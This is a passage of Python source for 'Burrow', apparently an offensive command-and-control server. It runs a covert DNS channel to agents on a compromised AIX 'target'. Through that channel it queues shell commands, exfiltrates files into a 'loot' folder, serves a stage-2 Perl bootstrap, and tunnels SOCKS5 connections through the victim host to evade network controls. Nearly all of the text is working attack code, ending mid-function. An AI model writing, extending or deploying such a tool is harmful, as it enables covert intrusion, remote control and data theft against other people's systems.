#!/usr/bin/env python3
"""
Burrow - DNS command channel and SOCKS tunnel for an AIX target. Server side.

Runs on the host the NS delegation for ZONE points at, answers the agent's
DNS queries and gives you a console with history and line editing.
Standard library only, Python 3.6+.

    sudo python3 burrow.py tunnel.example.com --ns ns1.example.com
    python3 burrow.py shell.test --bind 127.0.0.1 --port 5353           # local test

The agent is burrowclient.pl (Perl core modules + nslookup, nothing else).
burrowclient.sh is a fallback for hosts without Perl: shell tasks only.

Wire protocol, all names below ZONE, TTL 0:

  poll      TXT  <rand>.<cid>.h                    burrowclient.sh (task answered as hex)
            TXT  <rand>.<cid>.v2[t].t              burrowclient.pl ("t": its tunnel child is running)
                 answer "tid:<base64 task>" or "0"
  output    A    s<n>.<hex>...<tid>.<cid>.o         chunk n of a task's output
            A    e<n>.<tid>.<cid>.o                 n chunks were sent
  file      TXT  f<n>                               hex chunk n of --serve FILE, "end" after the last
  transfer  TXT  y<n>.<xid>                         hex chunk n of a transfer (put, long task)
  boot      TXT  b                                  --boot file, stage-2 Perl
  probe     TXT  <size>.<rand>.<cid>.z              an answer of exactly <size> chars (path test)
  tunnel    TXT  p<n>[.a<ack>][.r<old>].<cap>.<cid>.q   see class Tunnel
            A    u|k|x<sid>-<seq>[.<base32>].<cid>.v

Any other name is logged as a probe and answered, so a path test is visible
on the console before anything is deployed.
"""
import argparse
import base64
import binascii
import collections
import ctypes
import getpass
import hashlib
import os
import random
import re
import socket
import struct
import sys
import threading
import time

VERSION = "1.0"
HERE = os.path.dirname(os.path.abspath(__file__))
AGENT_SOURCE = os.path.join(HERE, "burrowclient.pl")
MAX_TASK_TXT = 400        # base64 chars in one task answer: the UDP reply stays under 512 bytes
CHUNK_HEX = 400           # hex chars per file/transfer chunk, same reason
ANSWER_IP = b"\x0a\x00\x00\x01"
OUR_EDNS = 4096           # UDP payload size we advertise in responses
TRANSFER_TTL = 900        # seconds a transfer stays available
OUTPUT_GRACE = 90         # seconds after the end marker before missing chunks are reported
GET_DIR = "loot"
PROBE_SIZES = "120,240,360,480,600,800,1000"


# ======================================================================
# DNS wire format
# ======================================================================

def parse_name(data, off):
    """Labels at off, and the offset just after the name (after a pointer: after the pointer)."""
    labels, jumps, end = [], 0, None
    while True:
        if off >= len(data):
            raise ValueError("truncated name")
        length = data[off]
        if length == 0:
            off += 1
            break
        if length & 0xC0 == 0xC0:
            if off + 1 >= len(data):
                raise ValueError("truncated pointer")
            ptr = struct.unpack("!H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            jumps += 1
            if jumps > 10:
                raise ValueError("pointer loop")
            off = ptr
            continue
        off += 1
        labels.append(data[off:off + length].decode("ascii", "replace"))
        off += length
    return labels, (end if end is not None else off)


def encode_name(name):
    return b"".join(bytes([len(l)]) + l.encode("ascii") for l in name.strip(".").split(".")) + b"\x00"


def txt_rdata(text):
    raw = text.encode("ascii", "replace")
    parts = [raw[i:i + 255] for i in range(0, len(raw), 255)] or [b""]
    return b"".join(bytes([len(p)]) + p for p in parts)


class Query(object):
    __slots__ = ("data", "labels", "qtype", "qend", "edns")


def parse_query(data):
    """The first question, plus the EDNS payload size if the resolver sent an OPT record."""
    if len(data) < 12:
        return None
    try:
        qd, an, ns, ar = struct.unpack("!HHHH", data[4:12])
        if qd < 1:
            return None
        labels, off = parse_name(data, 12)
        qtype, _qclass = struct.unpack("!HH", data[off:off + 4])
        off += 4
    except (IndexError, ValueError, struct.error):
        return None
    q = Query()
    q.data, q.labels, q.qtype, q.qend, q.edns = data, labels, qtype, off, None
    try:
        for _ in range(qd - 1):
            _, off = parse_name(data, off)
            off += 4
        for _ in range(an + ns + ar):
            _, off = parse_name(data, off)
            rtype, rclass, _ttl, rdlen = struct.unpack("!HHIH", data[off:off + 10])
            off += 10 + rdlen
            if rtype == 41:
                q.edns = max(512, min(rclass, 4096))
    except (IndexError, ValueError, struct.error):
        pass
    return q


def build_response(q, rcode, answers, authority=(), apex=b"", tc=False):
    """answers: (qtype, rdata, ttl) owned by the question name; authority: owned by the apex.
    An OPT record is echoed when the query had one, so EDNS resolvers see a proper EDNS reply."""
    flags = 0x8400 | rcode                     # QR, AA
    if q.data[2] & 0x01:                       # copy RD
        flags |= 0x0100
    if tc:
        flags |= 0x0200
    header = q.data[:2] + struct.pack("!HHHHH", flags, 1, len(answers), len(authority), 1 if q.edns else 0)
    body = q.data[12:q.qend]                   # the question, byte for byte (keeps 0x20 case)
    for qtype, rdata, ttl in answers:
        body += b"\xc0\x0c" + struct.pack("!HHIH", qtype, 1, ttl, len(rdata)) + rdata
    for qtype, rdata, ttl in authority:
        body += apex + struct.pack("!HHIH", qtype, 1, ttl, len(rdata)) + rdata
    if q.edns:
        body += b"\x00" + struct.pack("!HHIH", 41, OUR_EDNS, 0, 0)
    return header + body


def chunks_from_bytes(raw):
    hexdata = binascii.hexlify(raw).decode()
    return [hexdata[i:i + CHUNK_HEX] for i in range(0, len(hexdata), CHUNK_HEX)]


def sh_quote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def ago(t):
    return "%ds ago" % int(time.time() - t)


# ======================================================================
# Agents (the shell channel) and transfers
# ======================================================================

class Agent(object):
    def __init__(self, cid, addr):
        self.cid = cid
        self.addr = addr
        self.first_seen = self.last_seen = time.time()
        self.tasks = collections.deque()      # (tid, text)
        self.outputs = {}                     # tid -> reassembly record
        self.meta = {}                        # tid (str) -> how to treat the output (get, ...)
        self.sent = {}                        # tid (str) -> when the task went out
        self.polls = 0
        self.version = 1                      # 1: burrowclient.sh (shell tasks only), 2: burrowclient.pl
        self.flags = ""                       # "t": tunnel child running (v2)

    def describe(self):
        if self.version >= 2:
            s = "burrowclient.pl v%d" % self.version
            if "t" in self.flags:
                s += " [tunnel running]"
            return s
        return "basic agent (shell tasks only)"


class Transfer(object):
    def __init__(self, xid, raw, what):
        self.xid = xid
        self.chunks = chunks_from_bytes(raw)
        self.size = len(raw)
        self.what = what
        self.created = time.time()
        self.fetched = 0


SEQ_RE = re.compile(r"^[se]\d+$")
FILE_RE = re.compile(r"^f(\d+)$")
TRANSFER_RE = re.compile(r"^y(\d+)$")
VERSION_RE = re.compile(r"^v(\d+)([a-z]*)$")
XID_RE = re.compile(r"^[0-9a-f]{4}$")

PTY_DEFAULT_T = 35        # helper time limit; the beacon kills a task at 60 s and the fetch needs the rest
PTY_MAX_T = 50


class Burrow(object):
    def __init__(self, zone, ns_host="", serve_chunks=None, boot=None, listen="127.0.0.1"):
        self.lock = threading.RLock()
        self.zone = zone
        self.zone_labels = zone.split(".")
        self.apex = encode_name(zone)
        self.ns_rdata = self.soa_rdata = None
        if ns_host:
            self.ns_rdata = encode_name(ns_host)
            self.soa_rdata = (encode_name(ns_host) + encode_name("hostmaster." + zone)
                              + struct.pack("!IIIII", 1, 3600, 600, 86400, 60))
        self.serve_chunks = serve_chunks
        self.boot = boot
        self.agents = {}
        self.selected = None
        self.next_tid = 1
        self.transfers = {}
        self.console = None
        self.tunnel = Tunnel(self, listen)

    def log(self, msg):
        if self.console is not None:
            self.console.emit(msg)
        else:
            print(msg)

    # ---------- dispatch ----------

    def dispatch(self, data, addr, tcp):
        """One query in, one response out (None for junk)."""
        q = parse_query(data)
        if q is None:
            return None
        labels = [l.lower() for l in q.labels]
        n = len(self.zone_labels)
        if labels[-n:] != self.zone_labels:
            return build_response(q, 5, [])                     # REFUSED
        sub = labels[:-n]
        rcode, answers = 0, []
        try:
            answers = self.answer(sub, q, addr) or []
        except Exception as exc:                                # never let the listener die
            self.log("[!] handler error: %r" % (exc,))
            rcode = 2
        authority = []
        if not answers and rcode == 0 and self.soa_rdata:
            authority.append((6, self.soa_rdata, 60))           # lets resolvers cache NODATA
        resp = build_response(q, rcode, answers, authority, self.apex)
        if not tcp:
            limit = q.edns if q.edns else 512
            if len(resp) > limit:                               # too big for this resolver's UDP: TC, it retries over TCP
                resp = build_response(q, rcode, [], [], self.apex, tc=True)
        return resp

    def answer(self, sub, q, addr):
        qtype = q.qtype
        extra = self.tunnel.handle(sub, q, addr)
        if extra is not None:
            return extra
        if not sub:
            if qtype == 2 and self.ns_rdata:
                return [(2, self.ns_rdata, 60)]
            if qtype == 6 and self.soa_rdata:
                return [(6, self.soa_rdata, 60)]
            if qtype == 1:
                return [(1, ANSWER_IP, 60)]
            return []
        last = sub[-1]
        if sub == ["b"] and qtype == 16 and self.boot is not None:
            self.log("[b] bootstrap served to resolver %s" % addr[0])
            return [(16, txt_rdata(self.boot), 0)]
        if last in ("t", "h"):
            if qtype == 16 and len(sub) in (3, 4):
                reply = self.handle_poll(sub, addr)
                return [(16, txt_rdata(reply), 0)] if reply is not None else []
            return []                                           # resolver walking the name: NODATA
        if last == "o":
            if qtype == 1 and len(sub) >= 4 and SEQ_RE.match(sub[0]):
                self.handle_output(sub[:-1], addr)
                return [(1, ANSWER_IP, 0)]
            return []
        if last == "z":
            if qtype == 16 and len(sub) == 4 and sub[0].isdigit():
                size = max(1, min(int(sub[0]), 4000))
                self.log("[z] probe: %d-char answer asked by %s via resolver %s (%s)" % (
                    size, sub[2], addr[0], "EDNS %d" % q.edns if q.edns else "no EDNS"))
                return [(16, txt_rdata(probe_filler(size)), 0)]
            return []
        if len(sub) == 1 and FILE_RE.match(sub[0]) and qtype == 16 and self.serve_chunks is not None:
            n = int(FILE_RE.match(sub[0]).group(1))
            if n < len(self.serve_chunks):
                if n == 0 or n == len(self.serve_chunks) - 1:
                    self.log("[f] chunk %d/%d to resolver %s" % (n + 1, len(self.serve_chunks), addr[0]))
                return [(16, txt_rdata(self.serve_chunks[n]), 0)]
            self.log("[f] end marker to resolver %s" % addr[0])
            return [(16, txt_rdata("end"), 0)]
        if len(sub) == 2 and TRANSFER_RE.match(sub[0]) and qtype == 16:
            return self.handle_transfer(sub, addr)
        # Not part of the protocol: a probe. Log it so the path test is visible, answer so the far side sees success.
        self.log("[q] probe %s type %d from resolver %s" % (".".join(sub + self.zone_labels), qtype, addr[0]))
        if qtype == 16:
            return [(16, txt_rdata("ok"), 0)]
        if qtype == 1:
            return [(1, ANSWER_IP, 0)]
        return []

    # ---------- agents ----------

    def touch_agent(self, cid, addr, version=None, flags=None):
        with self.lock:
            agent = self.agents.get(cid)
            if agent is None:
                agent = self.agents[cid] = Agent(cid, addr)
                if version is not None:
                    agent.version, agent.flags = version, flags
                if self.selected is None:
                    self.selected = cid
                self.log("[+] new agent %s: %s, queries arrive via resolver %s" % (cid, agent.describe(), addr[0]))
            agent.last_seen = time.time()
            agent.addr = addr
            if version is not None:
                agent.version = version
                if flags != agent.flags:
                    if "t" in flags and "t" not in agent.flags:
                        self.log("[*] %s: tunnel child is running" % cid)
                    elif "t" in agent.flags and "t" not in flags:
                        self.log("[*] %s: tunnel child has stopped" % cid)
                    agent.flags = flags
            return agent

    def handle_poll(self, sub, addr):
        """sub: [rand, cid, h] (burrowclient.sh), [rand, cid, vN<flags>, t] (burrowclient.pl)."""
        cid, mode = sub[1], sub[-1]
        version, flags = None, None
        if len(sub) == 4:
            m = VERSION_RE.match(sub[2])
            if not m:
                return None
            version, flags = int(m.group(1)), m.group(2)
        agent = self.touch_agent(cid, addr, version, flags)
        with self.lock:
            agent.polls += 1
            if not agent.tasks:
                return "0"
            tid, text = agent.tasks.popleft()
            agent.sent[str(tid)] = time.time()
        enc = base64.b64encode(text.encode()).decode() if mode != "h" else binascii.hexlify(text.encode()).decode()
        self.log("[>] %s task %d sent (%d bytes)" % (cid, tid, len(text)))
        return "%d:%s" % (tid, enc)

    def queue_task(self, agent, text, meta=None):
        """Queue a task; long ones go to a v2 agent as a transfer it fetches first."""
        with self.lock:
            tid = self.next_tid
            self.next_tid += 1
            if len(base64.b64encode(text.encode())) > MAX_TASK_TXT:
                if agent.version < 2:
                    return None
                xid = self.new_transfer(text.encode(), "task %d" % tid)
                text = "@task %s %d" % (xid, len(self.transfers[xid].chunks))
            agent.tasks.append((tid, text))
            if meta:
                agent.meta[str(tid)] = meta
        return tid

    def handle_output(self, sub, addr):
        """sub: [seq, hex..., tid, cid] (the trailing o label already stripped)."""
        cid, tid, seq = sub[-1], sub[-2], sub[0]
        hexdata = "".join(sub[1:-2])
        agent = self.touch_agent(cid, addr)
        with self.lock:
            rec = agent.outputs.get(tid)
            if rec is None:
                rec = agent.outputs[tid] = {"chunks": {}, "next": 0, "total": None, "buf": b"",
                                            "bytes": 0, "started": time.time(), "last": time.time(),
                                            "ended": None, "warned": False}
            rec["last"] = time.time()
            if seq[0] == "e":
                rec["total"] = int(seq[1:])
                rec["ended"] = rec["ended"] or time.time()
            else:
                n = int(seq[1:])
                if n not in rec["chunks"] and n >= rec["next"]:
                    try:
                        rec["chunks"][n] = binascii.unhexlify(hexdata)
                    except (binascii.Error, ValueError):
                        rec["chunks"][n] = b"[bad chunk]"
            out = b""
            while rec["next"] in rec["chunks"]:
                out += rec["chunks"].pop(rec["next"])
                rec["next"] += 1
            meta = agent.meta.get(tid, {})
            if out:
                rec["buf"] += out
                rec["bytes"] += len(out)
                if meta.get("kind") not in ("get",):
                    cut = rec["buf"].rfind(b"\n")             # print complete lines as they arrive
                    if cut >= 0:
                        self.console_print(rec["buf"][:cut + 1])
                        rec["buf"] = rec["buf"][cut + 1:]
            if rec["total"] is not None and rec["next"] >= rec["total"]:
                agent.outputs.pop(tid, None)
                agent.meta.pop(tid, None)
                self.finish_output(agent, tid, rec, meta)

    def console_print(self, raw):
        self.log(raw.decode("utf-8", "replace").rstrip("\n"))

    def finish_output(self, agent, tid, rec, meta):
        took = time.time() - agent.sent.pop(tid, rec["started"])
        kind = meta.get("kind")
        if kind == "get":
            data = rec["buf"]
            head, _, rest = data.partition(b"\n")
            if head.startswith(b"ok ") and agent.version >= 2:
                data = rest
                self.save_get(meta, data, head.decode("ascii", "replace"))
            elif head.startswith(b"err ") and agent.version >= 2:
                self.log("[!] get %s failed: %s" % (meta["remote"], head[4:].decode("utf-8", "replace")))
            else:
                self.save_get(meta, data, "")
            return
        if rec["buf"]:
            self.console_print(rec["buf"])
        self.log("[<] %s task %s done: %d bytes in %d chunks, %.1fs" % (
            agent.cid, tid, rec["bytes"], rec["total"], took))

    def save_get(self, meta, data, head):
        path = meta["local"]
        d = os.path.dirname(path)
        if d and not os.path.isdir(d):
            os.makedirs(d)
        with open(path, "wb") as f:
            f.write(data)
        digest = hashlib.md5(data).hexdigest()
        note = ""
        parts = head.split()
        if len(parts) >= 3 and parts[2] != digest:
            note = "  MD5 MISMATCH: agent read %s" % parts[2]
        self.log("[<] get %s: %d bytes saved to %s  md5 %s%s" % (meta["remote"], len(data), path, digest, note))

    def housekeeping(self):
        """Report task outputs that ended with chunks missing; expire transfers."""
        while True:
            time.sleep(5)
            now = time.time()
            with self.lock:
                for agent in self.agents.values():
                    for tid, rec in list(agent.outputs.items()):
                        if rec["ended"] and now - rec["last"] > OUTPUT_GRACE and not rec["warned"]:
                            rec["warned"] = True
                            missing = [i for i in range(rec["total"]) if i >= rec["next"] and i not in rec["chunks"]]
                            if rec["buf"] and agent.meta.get(tid, {}).get("kind") != "get":
                                self.console_print(rec["buf"])
                                rec["buf"] = b""
                            self.log("[!] %s task %s: %d chunk(s) never arrived: %s" % (
                                agent.cid, tid, len(missing), missing[:10]))
                            agent.outputs.pop(tid, None)
                            agent.meta.pop(tid, None)
                for xid, t in list(self.transfers.items()):
                    if now - t.created > TRANSFER_TTL:
                        del self.transfers[xid]

    # ---------- transfers ----------

    def new_transfer(self, raw, what):
        with self.lock:
            xid = None
            while xid is None or xid in self.transfers:
                xid = "%04x" % random.randrange(65536)
            self.transfers[xid] = Transfer(xid, raw, what)
            return xid

    def handle_transfer(self, sub, addr):
        if len(sub) != 2:
            return []
        n = int(TRANSFER_RE.match(sub[0]).group(1))
        xid = sub[1]
        with self.lock:
            t = self.transfers.get(xid)
            if t is None:
                return []
            if n < len(t.chunks):
                t.fetched = max(t.fetched, n + 1)
                return [(16, txt_rdata(t.chunks[n]), 0)]
            self.log("[y] %s fetched by the target (%d chunks)" % (t.what, len(t.chunks)))
            return [(16, txt_rdata("end"), 0)]


def probe_filler(size):
    """A data-shaped TXT answer of exactly size chars, as the tunnel would send it."""
    raw = bytes((i * 37 + 11) & 0xFF for i in range(size))
    return ("#1~D|1|0|" + base64.b64encode(raw).decode())[:size]


# ======================================================================
# Tunnel: SOCKS5 and port forwards carried in the DNS channel
# ======================================================================
#
#  poll    TXT  p<n>[.a<ack>][.r<old>].<cap>.<cid>.q   -> "#<bseq>~" + messages joined by "~":
#            C|sid|host|port    open a TCP connection on the target
#            D|sid|off|base64   bytes for that connection, from byte offset off
#            X|sid|total        close it once all bytes up to total have been applied
#            X|sid              close it now
#            Q                  stop the tunnel client
#            N                  nothing
#          cap  rb/rs/nb/ns: raw or nslookup mode, big (1000-byte) or small answers
#          a<ack>  highest bseq the client has applied; every answer is cached under its poll
#                  number until the ack passes it, so a re-asked poll gets the same answer.
#          r<old>  "answer poll <old> under this new name": the client gave up on a name that
#                  never got its answer back (negative cache, filter), content is unchanged.
#          An answer asked for 5 times is cut to the small size, 10 times to the tiny size:
#          the path is dropping something, and the rest is re-sent in later answers (offsets
#          keep the data in order whatever the cut).
#  bigtest TXT  big.<cid>.q                -> 1000 bytes of filler, arrives only if the path allows it
#  upload  A    u<sid>-<seq>.<base32 labels>.<cid>.v   bytes from the connection
#               k<sid>-<1|0>.<cid>.v                    connect succeeded / failed
#               x<sid>-<seq>.<cid>.v                    remote closed, after seq-1

HDR_RE = re.compile(r"^([ukx])(\d+)-(\d+)$")
POLL_RE = re.compile(r"^p(\d+)$")
ACK_RE = re.compile(r"^a(\d+)$")
REASK_RE = re.compile(r"^r(\d+)$")
HOST_RE = re.compile(r"^[A-Za-z0-9._-]{1,200}$")
SMALL_LIMIT = 320               # chars per poll answer: whole UDP reply stays under 512 bytes
TINY_LIMIT = 120                # last resort when small answers do not arrive either
BIG_LIMIT = 1000                # only when the client proved big answers arrive
BIG_FILLER = "b" * 1000
DOWN_BACKLOG = 65536            # bytes queued per stream before the local reader waits
BEACON_STALE = 30               # seconds without a poll: refuse new streams
CLIENT_FORGET = 600             # seconds without a poll: drop the client's state
CACHE_MAX = 4096                # answers kept for a client that acknowledges (safety cap)
CACHE_MAX_NOACK = 64            # answers kept for an older client that never acknowledges


def b32dec(s):
    s = s.upper()
    s += "=" * (-len(s) % 8)
    try:
        return base64.b32decode(s)
    except Exception:
        return b""


def fmt_item(it):
    if it[0] == "c":
        return it[1]
    return "D|%d|%d|%s" % (it[1], it[2], base64.b64encode(it[3]).decode())


class Stream(object):
    def __init__(self, sid, host, port, sock, client):
        self.sid, self.host, self.port, self.sock, self.client = sid, host, port, sock, client
        self.down = collections.deque()       # (offset, bytes) waiting to go to the target
        self.down_bytes = 0
        self.down_off = 0                     # bytes ever queued for the target
        self.up_next = 0                      # next expected seq from the target
        self.up_pending = {}
        self.close_at = None
        self.connected = threading.Event()
        self.ok = False
        self.ready = False                    # local side may receive bytes now
        self.up_buf = b""
        self.closed = False
        self.local_closed = False
        self.up_total = 0
        self.down_total = 0                   # bytes built into answers at least once
        self.opened = time.time()


class TunnelClient(object):
    def __init__(self, cid, mode, resolver):
        self.cid, self.mode, self.resolver = cid, mode, resolver
        self.quits = False                    # cap label carries "q": burrowclient.pl, understands the Q message
        self.cap_limit = BIG_LIMIT            # lowered when answers are seen not to arrive
        self.started = self.last_seen = time.time()
        self.polls = 0
        self.acks = False                     # client sends a<ack> labels
        self.streams = {}
        self.ctl = collections.deque()        # control messages, in order
        self.requeue = collections.deque()    # (sid, off, bytes) cut from shrunk answers, go first
        self.poll_cache = collections.OrderedDict()   # n -> {"n", "resp", "items", "asked", "bseq"}, by bseq
        self.alias = {}                       # re-asked poll n -> original n
        self.bseq = 0
        self.quitting = False


class Tunnel(object):
    def __init__(self, burrow, listen):
        self.b = burrow
        self.listen = listen
        self.lock = threading.Lock()
        self.cv = threading.Condition(self.lock)
        self.clients = {}
        self.active = None                    # cid that polled last: gets new connections
        self.next_sid = 1
        self.switch_logged = 0
        self.listeners = {}                   # local port -> {"sock", "kind", "host", "rport"}

    def log(self, msg):
        self.b.log("[tun] " + msg)

    # ---------- DNS side, called from the listener thread ----------

    def handle(self, sub, q, addr):
        qtype = q.qtype
        if sub and sub[-1] == "q" and qtype == 16:
            m = POLL_RE.match(sub[0]) if len(sub) in (4, 5, 6) else None
            if m:
                n = int(m.group(1))
                cid, cap, ack, reask = sub[-2], sub[-3], None, None
                for opt in sub[1:-3]:
                    ma, mr = ACK_RE.match(opt), REASK_RE.match(opt)
                    if ma:
                        ack = int(ma.group(1))
                    elif mr:
                        reask = int(mr.group(1))
                    else:
                        return []
                return [(16, txt_rdata(self.poll(n, ack, reask, cap, cid, addr, q.edns)), 0)]
            if len(sub) == 3 and sub[0] == "big":
                self.log("client %s testing whether 1000-byte answers reach it (%s)" % (
                    sub[1], "EDNS %d" % q.edns if q.edns else "no EDNS: they cannot"))
                return [(16, txt_rdata(BIG_FILLER), 0)]
            return []
        if sub and sub[-1] == "v" and qtype == 1 and len(sub) >= 3:
            self.upload(sub[:-2], sub[-2])
            return [(1, ANSWER_IP, 0)]
        if sub and sub[-1] in ("q", "v"):
            return []          # resolver walking the name label by label: NODATA, no log
        return None

    def _client(self, cid, cap, addr):
        now = time.time()
        c = self.clients.get(cid)
        if c is None:
            mode = "nslookup" if cap[:1] == "n" or cap == "s" else "raw"
            c = self.clients[cid] = TunnelClient(cid, mode, addr[0])
            c.quits = "q" in cap
            self.log("tunnel client %s active (%s mode%s, via resolver %s)" % (
                cid, mode, "" if c.quits else ", older version without stop support", addr[0]))
        if self.active not in (None, cid):
            old = self.clients.get(self.active)
            if old is not None and not old.quitting and now - old.last_seen < BEACON_STALE \
                    and now - self.switch_logged > 60:
                self.switch_logged = now
                self.log("two tunnel clients are polling (%s and %s): new connections go to %s; "
                         "'socks stop' then 'socks <port>' again sorts it out" % (old.cid, cid, cid))
        self.active = cid
        c.last_seen = now
        c.polls += 1
        for other in list(self.clients.values()):
            if other is not c and now - other.last_seen > CLIENT_FORGET:
                for s in list(other.streams.values()):
                    self._drop(s, "client went away")
                del self.clients[other.cid]
                self.log("forgot tunnel client %s, silent for %d s" % (other.cid, CLIENT_FORGET))
        return c

    def poll(self, n, ack, reask, cap, cid, addr, edns):
        big = "b" in cap and edns is not None and edns >= 1100
        with self.lock:
            c = self._client(cid, cap, addr)
            if ack is not None and ack <= c.bseq:           # larger: left over from a previous server life
                c.acks = True
                while c.poll_cache:
                    first = next(iter(c.poll_cache.values()))
                    if first["bseq"] > ack:
                        break
                    c.poll_cache.popitem(last=False)
                for a in [a for a, o in c.alias.items() if o not in c.poll_cache]:
                    del c.alias[a]
            lp = c.poll_cache.get(c.alias.get(n, n))
            if lp is None and reask is not None:
                old = c.alias.get(reask, reask)
                lp = c.poll_cache.get(old)
                if lp is not None:
                    c.alias[n] = old
                    self.log("client %s re-asked poll %d as %d (answer #%d, %d chars, asked %d times)" % (
                        cid, reask, n, lp["bseq"], len(lp["resp"]), lp["asked"]))
            if lp is not None:
                lp["asked"] += 1
                if lp["asked"] >= 10 and len(lp["resp"]) > TINY_LIMIT:
                    self._shrink_cached(c, lp, TINY_LIMIT)
                elif lp["asked"] >= 5 and len(lp["resp"]) > SMALL_LIMIT:
                    self._shrink_cached(c, lp, SMALL_LIMIT)
                return "#%d~%s" % (lp["bseq"], lp["resp"])
            limit = min(BIG_LIMIT if big else SMALL_LIMIT, c.cap_limit)
            items = self._build(c, limit)
            resp = "~".join(fmt_item(it) for it in items) if items else "N"
            c.bseq += 1
            c.poll_cache[n] = {"n": n, "resp": resp, "items": items, "asked": 1, "bseq": c.bseq}
            cap_n = CACHE_MAX if c.acks else CACHE_MAX_NOACK
            while len(c.poll_cache) > cap_n:
                c.poll_cache.popitem(last=False)
            return "#%d~%s" % (c.bseq, resp)

    def _build(self, c, limit):
        """Fill one answer: cut-off remainders first, then control messages, then stream data."""
        items, size = [], 0

        def room():
            return (limit - size - 20) * 3 // 4 - 3

        while c.requeue and room() >= 16:
            sid, off, raw = c.requeue.popleft()
            r = room()
            if len(raw) > r:
                c.requeue.appendleft((sid, off + r, raw[r:]))
                raw = raw[:r]
            items.append(("d", sid, off, raw))
            size += len(fmt_item(items[-1])) + 1
        while c.ctl and size < limit:
            m = c.ctl.popleft()
            items.append(("c", m))
            size += len(m) + 1
        progress = True
        while progress:
            progress = False
            for s in list(c.streams.values()):
                if not s.down:
                    continue
                r = room()
                if r < 16:
                    break
                off, chunk = s.down.popleft()
                if len(chunk) > r:
                    s.down.appendleft((off + r, chunk[r:]))
                    chunk = chunk[:r]
                s.down_bytes -= len(chunk)
                s.down_total += len(chunk)
                items.append(("d", s.sid, off, chunk))
                size += len(fmt_item(items[-1])) + 1
                progress = True
        for s in list(c.streams.values()):
            if s.local_closed and not s.down:
                self._drop(s, "closed by local side")
                c.ctl.append("X|%d|%d" % (s.sid, s.down_off))
        self.cv.notify_all()
        return items

    def _shrink_cached(self, c, lp, target):
        """The client keeps asking for the same answer: it is probably too big for the path.
        Keep the prefix that fits in target chars; the rest goes out again in later answers."""
        if c.cap_limit > target:
            c.cap_limit = target
            self.log("answers of %d chars are not reaching client %s: cut to %d from now on%s" % (
                len(lp["resp"]), c.cid, target,
                "" if target > TINY_LIMIT else "  (if these arrive, the path drops anything bigger; 'probe' measures it)"))
        keep, size, rest = [], 0, []
        for it in lp["items"]:
            text = fmt_item(it)
            if not rest and size + len(text) + 1 <= target:
                keep.append(it)
                size += len(text) + 1
                continue
            if not rest and it[0] == "d":
                r = (target - size - 20) * 3 // 4 - 3
                if r >= 16:
                    keep.append(("d", it[1], it[2], it[3][:r]))
                    size += len(fmt_item(keep[-1])) + 1
                    rest.append(("d", it[1], it[2] + r, it[3][r:]))
                    continue
            rest.append(it)
        for it in reversed(rest):                     # back to the front, order preserved
            if it[0] == "c":
                c.ctl.appendleft(it[1])
            else:
                c.requeue.appendleft(it[1:])
        lp["items"] = keep
        lp["resp"] = "~".join(fmt_item(it) for it in keep) if keep else "N"
        self.log("poll %d asked %d times: answer cut to %d chars, rest re-sent later" % (
            lp["n"], lp["asked"], len(lp["resp"])))

    def upload(self, parts, cid):
        m = HDR_RE.match(parts[0]) if parts else None
        if not m:
            return
        kind, sid, seq = m.group(1), int(m.group(2)), int(m.group(3))
        with self.lock:
            c = self.clients.get(cid)
            if c is None:
                return
            s = c.streams.get(sid)
            if s is None:
                return
            if kind == "k":
                s.ok = (seq == 1)
                s.connected.set()
                return
            if kind == "u":
                if seq >= s.up_next and seq not in s.up_pending:
                    s.up_pending[seq] = b32dec("".join(parts[1:]))
            else:
                s.close_at = seq
            self._deliver(s)

    def _deliver(self, s):
        while s.up_next in s.up_pending:
            s.up_buf += s.up_pending.pop(s.up_next)
            s.up_next += 1
        if s.ready and s.up_buf:
            data, s.up_buf = s.up_buf, b""
            try:
                s.sock.sendall(data)
                s.up_total += len(data)
            except OSError:
                self._drop(s, "local write failed")
                s.client.ctl.append("X|%d" % s.sid)
                return
        if s.close_at is not None and s.up_next >= s.close_at and not s.up_buf and s.ready:
            self._drop(s, "closed by remote side")

    def _drop(self, s, why):
        if s.closed:
            return
        s.closed = True
        s.client.streams.pop(s.sid, None)
        s.connected.set()
        try:
            s.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            s.sock.close()
        except OSError:
            pass
        self.log("stream %d %s:%d %s  (up %d B, down %d B, %.1fs)" % (
            s.sid, s.host, s.port, why, s.up_total, s.down_total, time.time() - s.opened))
        self.cv.notify_all()

    # ---------- local side, called from listener threads ----------

    def open_stream(self, host, port, sock):
        with self.lock:
            c = self.clients.get(self.active)
            if c is None or c.quitting or time.time() - c.last_seen > BEACON_STALE:
                return None
            sid = self.next_sid
            self.next_sid += 1
            s = Stream(sid, host, port, sock, c)
            c.streams[sid] = s
            c.ctl.append("C|%d|%s|%d" % (sid, host, port))
            self.log("stream %d -> %s:%d requested via client %s" % (sid, host, port, c.cid))
            return s

    def mark_ready(self, s):
        with self.lock:
            s.ready = True
            self._deliver(s)

    def push_down(self, s, data):
        with self.lock:
            while not s.closed and s.down_bytes >= DOWN_BACKLOG:
                self.cv.wait(1.0)
            if s.closed:
                return False
            s.down.append((s.down_off, data))
            s.down_off += len(data)
            s.down_bytes += len(data)
            return True

    def close_from_local(self, s, why="closed by local side"):
        with self.lock:
            if s.closed:
                return
            if s.down:
                s.local_closed = True            # X goes out once the queue drains
            else:
                self._drop(s, why)
                s.client.ctl.append("X|%d|%d" % (s.sid, s.down_off))

    def discard(self, s, why):
        with self.lock:
            self._drop(s, why)

    def quit_clients(self, cid=None):
        """Tell the tunnel client(s) of this agent id (all if None) to stop.
        Returns (told, older): older clients do not understand Q and must be killed on the target."""
        told, older = [], []
        with self.lock:
            for c in self.clients.values():
                if cid is None or c.cid == cid:
                    for s in list(c.streams.values()):
                        self._drop(s, "tunnel stopped")
                    c.ctl.append("Q")
                    c.quitting = True
                    (told if c.quits else older).append(c.cid)
        return told, older

    def polling(self, cid):
        with self.lock:
            c = self.clients.get(cid)
            return c is not None and not c.quitting and time.time() - c.last_seen < BEACON_STALE

    def status_lines(self):
        lines = []
        with self.lock:
            for port, l in sorted(self.listeners.items()):
                if l["kind"] == "socks":
                    lines.append("SOCKS5 on %s:%d (no auth; hostnames resolve on the target)" % (self.listen, port))
                else:
                    lines.append("forward %s:%d -> %s:%d" % (self.listen, port, l["host"], l["rport"]))
            if not self.listeners:
                lines.append("no local listeners ('socks <port>' or 'forward <lport>:<host>:<rport>')")
            if not self.clients:
                lines.append("no tunnel client has polled yet")
            now = time.time()
            for c in self.clients.values():
